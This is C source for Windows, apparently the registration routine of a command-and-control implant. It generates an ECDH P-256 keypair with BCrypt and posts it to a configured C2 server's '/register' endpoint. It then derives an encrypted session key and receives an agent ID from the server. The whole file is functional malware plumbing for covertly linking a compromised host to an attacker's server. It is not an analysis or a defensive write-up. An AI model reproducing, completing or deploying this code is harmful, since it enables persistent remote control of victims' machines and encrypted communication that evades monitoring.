#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "crypto/ecdh.h"
#include "transport/http.h"
#include "config.h"

uint8_t SESSION_KEY[32] = {0};

void gen_random_bytes(uint8_t *buf, size_t len) {
    BCRYPT_ALG_HANDLE hAlg;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, NULL, 0) == 0) {
        BCryptGenRandom(hAlg, buf, (ULONG)len, 0);
        BCryptCloseAlgorithmProvider(hAlg, 0);
    } else {
        /* fallback — BCryptRNG unavailable */
        for (size_t i = 0; i < len; i++)
            buf[i] = (uint8_t)(rand() & 0xFF);
    }
}

/**
 * @brief SHA-256 a buffer via BCrypt.
 * @param data     Input bytes.
 * @param data_len Input length.
 * @param out      32-byte output buffer.
 * @return 0 on success, -1 on failure.
 */
static int bcrypt_sha256(const uint8_t *data, ULONG data_len, uint8_t out[32]) {
    BCRYPT_ALG_HANDLE  hAlg  = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptHashData(hHash, (PUCHAR)data, data_len, 0)))
        goto cleanup;
    if (!BCRYPT_SUCCESS(BCryptFinishHash(hHash, out, 32, 0)))
        goto cleanup;
    result = 0;

cleanup:
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

int import_peer_pubkey(const uint8_t peer_x962[65], BCRYPT_KEY_HANDLE *hKey_out) {
    /* Build BCRYPT_ECCKEY_BLOB: [magic(4)][cbKey(4)][X(32)][Y(32)] */
    uint8_t  blob[8 + 64];
    uint32_t magic = 0x314B4345u;  /* BCRYPT_ECDH_PUBLIC_P256_MAGIC */
    uint32_t cbKey = 32;
    memcpy(blob,     &magic, 4);
    memcpy(blob + 4, &cbKey, 4);
    memcpy(blob + 8, peer_x962 + 1, 64);  /* skip 0x04 prefix */

    BCRYPT_ALG_HANDLE hAlg = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider(ECDH_P256) failed\n");
        return -1;
    }
    NTSTATUS status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_ECCPUBLIC_BLOB,
                                          hKey_out, blob, sizeof(blob), 0);
    if (!BCRYPT_SUCCESS(status))
        fprintf(stderr, "[!] BCryptImportKeyPair failed: 0x%08lX\n", (unsigned long)status);
    else
        result = 0;

    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

int gen_ecdh_keypair(BCRYPT_KEY_HANDLE *hPrivKey_out, uint8_t our_pub_x962[65]) {
    BCRYPT_ALG_HANDLE hAlg   = NULL;
    int               result = -1;

    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0))) {
        fprintf(stderr, "[!] BCryptOpenAlgorithmProvider(ECDH_P256) failed\n");
        return -1;
    }
    if (!BCRYPT_SUCCESS(BCryptGenerateKeyPair(hAlg, hPrivKey_out, 256, 0))) {
        fprintf(stderr, "[!] BCryptGenerateKeyPair failed\n");
        goto cleanup;
    }
    if (!BCRYPT_SUCCESS(BCryptFinalizeKeyPair(*hPrivKey_out, 0))) {
        fprintf(stderr, "[!] BCryptFinalizeKeyPair failed\n");
        BCryptDestroyKey(*hPrivKey_out);
        *hPrivKey_out = NULL;
        goto cleanup;
    }

    /* Export as BCRYPT_ECCKEY_BLOB, then reformat to X9.62 */
    uint8_t blob[8 + 64];
    ULONG   blob_len = 0;
    if (!BCRYPT_SUCCESS(BCryptExportKey(*hPrivKey_out, NULL, BCRYPT_ECCPUBLIC_BLOB,
                                        blob, sizeof(blob), &blob_len, 0))
        || blob_len < 8 + 64) {
        fprintf(stderr, "[!] BCryptExportKey failed\n");
        BCryptDestroyKey(*hPrivKey_out);
        *hPrivKey_out = NULL;
        goto cleanup;
    }

    our_pub_x962[0] = 0x04;
    memcpy(our_pub_x962 + 1, blob + 8, 64);
    result = 0;

cleanup:
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

int derive_session_key(BCRYPT_KEY_HANDLE hPrivKey, BCRYPT_KEY_HANDLE hPeerPub) {
    BCRYPT_SECRET_HANDLE hSecret = NULL;
    int result = -1;

    if (!BCRYPT_SUCCESS(BCryptSecretAgreement(hPrivKey, hPeerPub, &hSecret, 0))) {
        fprintf(stderr, "[!] BCryptSecretAgreement failed\n");
        goto cleanup;
    }

    ULONG raw_len = 0;
    BCryptDeriveKey(hSecret, BCRYPT_KDF_RAW_SECRET, NULL, NULL, 0, &raw_len, 0);
    if (raw_len == 0) {
        fprintf(stderr, "[!] BCryptDeriveKey (size query) returned 0\n");
        goto cleanup;
    }

    uint8_t *raw = (uint8_t *)malloc(raw_len);
    if (!raw) goto cleanup;

    if (!BCRYPT_SUCCESS(BCryptDeriveKey(hSecret, BCRYPT_KDF_RAW_SECRET, NULL,
                                         raw, raw_len, &raw_len, 0))) {
        fprintf(stderr, "[!] BCryptDeriveKey (extract) failed\n");
        free(raw);
        goto cleanup;
    }

    /* BCrypt returns the X coordinate little-endian; Python's cryptography
     * library returns it big-endian. Reverse before hashing so both sides
     * compute the same SESSION_KEY. */
    for (ULONG i = 0; i < raw_len / 2; i++) {
        uint8_t tmp          = raw[i];
        raw[i]               = raw[raw_len - 1 - i];
        raw[raw_len - 1 - i] = tmp;
    }

    uint8_t hash[32];
    if (bcrypt_sha256(raw, raw_len, hash) == 0) {
        memcpy(SESSION_KEY, hash, 32);
        SecureZeroMemory(hash, 32);
        result = 0;
    }
    SecureZeroMemory(raw, raw_len);
    free(raw);

cleanup:
    if (hSecret) BCryptDestroySecret(hSecret);
    BCryptDestroyKey(hPrivKey);
    BCryptDestroyKey(hPeerPub);
    return result;
}

int do_register(char *agent_id, int agent_id_size) {
    BCRYPT_KEY_HANDLE hPriv    = NULL;
    BCRYPT_KEY_HANDLE hPeerPub = NULL;
    uint8_t  our_pub[65] = {0};
    uint8_t *resp        = NULL;
    int      resp_len    = 0;
    int      result      = -1;

    fprintf(stderr, "[*] Generating ephemeral ECDH-P256 keypair\n");
    if (gen_ecdh_keypair(&hPriv, our_pub) != 0)
        return -1;

    fprintf(stderr, "[*] Sending pubkey to %s:%d\n", C2_SERVER_IP, C2_SERVER_PORT);
    if (http_post_raw(C2_SERVER_IP, C2_SERVER_PORT, "/register",
                      our_pub, 65, &resp, &resp_len) != 0 || !resp) {
        fprintf(stderr, "[!] /register request failed\n");
        BCryptDestroyKey(hPriv);
        return -1;
    }

    if (resp_len < 66) {
        fprintf(stderr, "[!] /register response too short (%d bytes)\n", resp_len);
        goto cleanup;
    }
    if (resp[0] != 0x04) {
        fprintf(stderr, "[!] /register response missing X9.62 prefix\n");
        goto cleanup;
    }

    if (import_peer_pubkey(resp, &hPeerPub) != 0)
        goto cleanup;

    if (derive_session_key(hPriv, hPeerPub) != 0) {
        hPriv = hPeerPub = NULL;
        goto cleanup;
    }
    hPriv = hPeerPub = NULL;
    fprintf(stderr, "[*] Session key established\n");

    int id_len = resp_len - 65;
    if (id_len >= agent_id_size) id_len = agent_id_size - 1;
    memcpy(agent_id, resp + 65, id_len);
    agent_id[id_len] = '\0';

    char *nl;
    if ((nl = strchr(agent_id, '\r'))) *nl = '\0';
    if ((nl = strchr(agent_id, '\n'))) *nl = '\0';

    if (agent_id[0] == '\0') {
        fprintf(stderr, "[!] Empty agent ID in response\n");
        goto cleanup;
    }
    fprintf(stderr, "[*] Registered as %.8s\n", agent_id);
    result = 0;

cleanup:
    free(resp);
    if (hPriv)    BCryptDestroyKey(hPriv);
    if (hPeerPub) BCryptDestroyKey(hPeerPub);
    return result;
}
